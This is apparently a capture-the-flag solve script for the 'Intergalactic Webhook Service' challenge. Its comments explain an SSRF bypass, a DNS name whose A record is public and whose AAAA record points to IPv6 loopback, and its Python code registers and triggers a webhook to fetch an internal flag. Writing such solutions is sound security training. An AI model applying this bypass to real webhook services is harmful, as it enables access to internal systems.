#!/usr/bin/env python3
# =============================================================================
# Intergalactic Webhook Service – IPv6 SSRF Bypass Helper
#
# Challenge summary
# -----------------
# The target web app lets users register a webhook URL and later triggers it
# (server-side POST). It *tries* to block SSRF by resolving the host with
# IPv4-only (socket.gethostbyname) and rejecting private/loopback/etc.
# However, when it actually sends the HTTP request it uses the system resolver,
# which may *prefer IPv6 (AAAA)*. If a hostname has:
#   - a public A record (passes the IPv4 allowlist check), and
#   - an AAAA record pointing to loopback (e.g., ::ffff:127.0.0.1 or ::1),
# the validator OKs it, but the real request can go to IPv6 loopback and reach
# the internal flag server on 127.0.0.1:5001/flag. Classic v4-allowlist/v6-route
# mismatch → SSRF.
#
# What you need
# -------------
# Control of any DNS name where you can set both:
#   A     a.public.domain → <any public IPv4> (e.g., 8.8.8.8 or your VPS)
#   AAAA  a.public.domain → ::ffff:127.0.0.1   (or ::1 if provider rejects)
# On FreeDNS (chickenkiller.com) this works as: ::ffff:7f00:1 (hex form).
#
# How to use
# ----------
# 1) Set SUBDOM below to your subdomain (e.g., "awsder.chickenkiller.com").
# 2) Run this script. It:
#    - registers http://<SUBDOM>:5001/flag
#    - triggers it and prints the upstream body (the flag)
#
# Tips / Troubleshooting
# ----------------------
# - Verify both records resolve:
#     dig +short A     <SUBDOM> @1.1.1.1
#     dig +short AAAA  <SUBDOM> @1.1.1.1
# - If AAAA is ::1 and nothing returns, try ::ffff:127.0.0.1 (or the hex
#   form ::ffff:7f00:1). Some stacks prefer one over the other.
# - Make sure DNS proxy/CDN is OFF; you want raw DNS answers.
# - If resolver caching bites, create a fresh subdomain and repeat.
#
# Safety / Notes
# --------------
# - Redirects are disabled by the challenge (allow_redirects=False), so the
#   AAAA trick is the intended path.
# - The script prints a quick heuristic if the body *looks* like a flag.
#
# =============================================================================

import sys, requests, json

BASE = "https://supernova.sunshinectf.games"  # challenge host
SUBDOM = "a.yourdomain.tld"                   # <-- replace with your DNS name

def register(url: str) -> str:
    """Register the webhook URL with the challenge and return its id."""
    r = requests.post(f"{BASE}/register", data={"url": url})
    r.raise_for_status()
    try:
        j = r.json()
    except Exception:
        print("[!] /register did not return JSON:", r.status_code, r.text[:300])
        sys.exit(1)
    if j.get("status") != "registered" or "id" not in j:
        print("[!] Register failed:", j)
        sys.exit(1)
    return j["id"]

def trigger(wid: str) -> dict:
    """Trigger the stored webhook by id and return the JSON response."""
    r = requests.post(f"{BASE}/trigger", data={"id": wid})
    try:
        j = r.json()
    except Exception:
        print("[!] /trigger non-JSON:", r.status_code, r.text[:300])
        sys.exit(1)
    return j

def main():
    target = f"http://{SUBDOM}:5001/flag"
    print("[*] Registering:", target)
    wid = register(target)
    print("[+] Registered id:", wid)

    print("[*] Triggering…")
    res = trigger(wid)
    status = res.get("status")
    body = res.get("response", "")
    print("[*] Upstream status:", status)
    print("[*] Upstream body:\n", body)

    # quick guess if we got the flag
    if isinstance(body, str) and any(tok in body.lower() for tok in ("flag", "ctf", "{", "}")):
        print("\n[+] Looks like a flag above ✅")
    else:
        print("\n[!] Didn’t see a flag. If AAAA is ::1, try ::ffff:127.0.0.1 (or ::ffff:7f00:1), or vice-versa.")

if __name__ == "__main__":
    main()
